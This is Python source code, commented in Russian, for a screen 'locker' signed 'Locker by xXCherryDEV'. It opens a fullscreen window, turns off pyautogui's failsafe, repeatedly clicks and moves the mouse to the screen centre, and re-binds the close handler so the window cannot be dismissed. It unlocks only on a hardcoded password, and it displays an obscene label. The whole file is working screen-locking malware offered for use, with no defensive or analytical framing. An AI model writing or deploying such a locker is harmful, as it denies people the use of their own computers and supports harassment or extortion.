import pyautogui
from tkinter import Tk, Entry, Label
from pyautogui import click, moveTo
from time import sleep

def callback(event):
    global k
    global entry
    if entry.get() == 'zelenka.guru':
        k = True

def on_closing():
    click(width/1.5, height/1.5) # Кликаем в центр экрана
    moveTo(width/1.5, height/1.5) # Перемещаем курсор мыши в центр экрана
    root.attributes("-fullscreen", True) # Открытие локера на весь экран
    root.protocol("WM_DELETE_WINDOW", on_closing) # При попытке закрыть локера с помощью диспетчера задач вызываем on_closing
    root.update() # Обновляем экран
    root.bind('<Control-KeyPress-c>', callback)



root = Tk() # Создаем окно самого локера
pyautogui.FAILSAFE = False # Вырубаем защиту левого верхнего угла
width = root.winfo_screenwidth() # Узнаем ширину экрана
height = root.winfo_screenheight() # Узнаем высоту экрана
root.title("Locker by xXCherryDEV") # Заголовок окна
root.attributes("-fullscreen", True) # Открытие локера на весь экран
# Создаем окно ввода и задаем ему размеры и расположение на экране
entry = Entry(root, font=1)
entry.place(width=150, height=50, x=width/2-75, y=height/2-25)
# Созданем текстовые подписи и задаем их расположение
label10 = Label(root, text="SOSI HUY", font=1)
label10.grid(row=0, column=0)
label11 = Label(root, text="Вводи пароль и нажимай CTRL+C", font='Arial 20')
label11.place(x=width/2-75-130, y=height/2-25-100)
root.update() # Включаем обноление окна локера
sleep(0.2) # Делаем паузу
click(width/1.5, height/1.5) # Клик в центр экрана
k = False # Придаем для переменной значение boolean false
while not k:
    on_closing()

